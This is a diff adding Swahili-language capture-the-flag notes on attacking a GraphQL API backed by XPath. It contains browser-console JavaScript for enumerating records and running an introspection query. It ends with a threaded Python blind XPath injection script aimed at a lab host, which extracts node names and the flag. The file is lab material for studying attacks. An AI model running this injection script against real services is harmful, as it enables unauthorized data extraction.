@@ -1,0 +1,120 @@
+UTAJUAJE KAMA MFUMO UNA XPATH:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+PAYLOAD'S
+
+JAVASCRIPT
+Hii hapa ile payload ya JavaScript iliyokusaidia kuvuta na kuorodhesha ID zote za vitabu hapo awali.
+Unaweza kunakili (Copy) na kuibandika (Paste) moja kwa moja kwenye Console ya Firefox (na hapa nimeshaweka port mpya ya :7255 kulingana na ulivyobadilisha hivi karibuni):
+NB:IZO paylods za js tumia kwa Developer tools > console  [start with:"allow pasting" ] then paste.
+#########################################################################################################################################################################
+
+var getValidId = new XMLHttpRequest();
+getValidId.open('POST', '/api/graphql', true);
+getValidId.setRequestHeader('Content-Type', 'application/json');
+getValidId.onload = function () {
+    var res = JSON.parse(getValidId.responseText);
+    console.log("%c ID ZA VITABU VILIVYOPO:", "color: lime; background: black; font-size: 14px;");
+    res.data.books.forEach(b => console.log(`ID: ${b.id} - Jina: ${b.title}`));
+};
+getValidId.send(JSON.stringify({ query: `{ books { id title } }` }));
+
+########################################################################################################################################################################
+
+INTROSPECTION QUERY
+Introspection Query maana yake ni "Ombi la Kujikagua". Ni mbinu au swali maalum unaloliuliza mfumo wa GraphQL ili ujinong'oneze wenyewe na kukupa siri zake zote za ndani.
+Kwenye GraphQL, mfumo huu hauna siri za muundo wake (Schema). Ukiutumia "Introspection Query", unaiamuru API ikupatie ramani nzima ya jinsi ilivyojengwa.
+########################################################################################################################################################################
+
+var introspect = new XMLHttpRequest();
+introspect.open('POST', '/api/graphql', true);
+introspect.setRequestHeader('Content-Type', 'application/json');
+introspect.onload = function () {
+    var res = JSON.parse(introspect.responseText);
+    console.log("%c QUERIES ZILIZOPO KWENYE SEVA:", "color: lime; background: black; font-size: 14px;");
+    
+    var fields = res.data.__schema.queryType.fields;
+    fields.forEach(f => {
+        console.log(`- Jina: ${f.name}`);
+        if(f.args.length > 0) {
+            console.log(`  Vigezo vinavyokubalika (Args): ${f.args.map(a => a.name).join(', ')}`);
+        }
+    });
+};
+introspect.send(JSON.stringify({
+    query: `{ __schema { queryType { fields { name args { name } } } } }`
+}));
+
+#########################################################################################################################################################################
+
+Faida ya Introspection Query kwa Mdukuzi (Pentester):
+1.ugundua milango iliyofichwa: Inakutajia majina ya Queries na Mutations zote zilizopo kwenye mfumo.
+2.Kujua vigezo (Arguments): Inakuambia kila function inataka uingize data ya aina gani (kama tulivyogundua kuwa book inataka kigezo cha id).
+3.Kugundua vitu vya majaribio: Wakati mwingine inafichua milango ya siri iliyoachwa na watengenezaji (kama isAdmin, deleteUser, n.k.).
+
+FINALL TO CAPTURE FLAG
+USE PYTHON3
+#########################################################################################################################################################################
+
+import json, urllib.request
+from concurrent.futures import ThreadPoolExecutor
+
+URL = "http://labs.ctfzone.com:8510/api/graphql"
+
+def raw(payload):
+    body = json.dumps({
+        'query': 'query($id:String!){ book(id:$id){ id } }',
+        'variables': {'id': payload}
+    }).encode()
+    req = urllib.request.Request(URL, body, {'Content-Type': 'application/json'})
+    return json.load(urllib.request.urlopen(req, timeout=15))
+
+def oracle(cond):
+    p = 'zzz" or (' + cond + ') or "a"="b'
+    return raw(p).get('data', {}).get('book') is not None
+
+ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}."
+
+def char_at(s, pos):
+    cand = list(ALPH)
+    while len(cand) > 1:
+        half = cand[:len(cand)//2]
+        if oracle('contains("%s",substring(%s,%d,1))' % ("".join(half), s, pos)):
+            cand = half
+        else:
+            cand = cand[len(cand)//2:]
+    return cand[0]
+
+def extract(s, mx=120):
+    n = next(i for i in range(mx) if oracle("string-length(%s)=%d" % (s, i)))
+    res = [None] * n
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futs = {ex.submit(char_at, s, p+1): p for p in range(n)}
+        for f in futs:
+            res[futs[f]] = f.result()
+    return "".join(res)
+
+print("child2  :", extract("name(/*/*[2])"))
+print("FLAG    :", extract("string(/*/*[2]/*)"))
+
+########################################################################################################################################################################
+
+
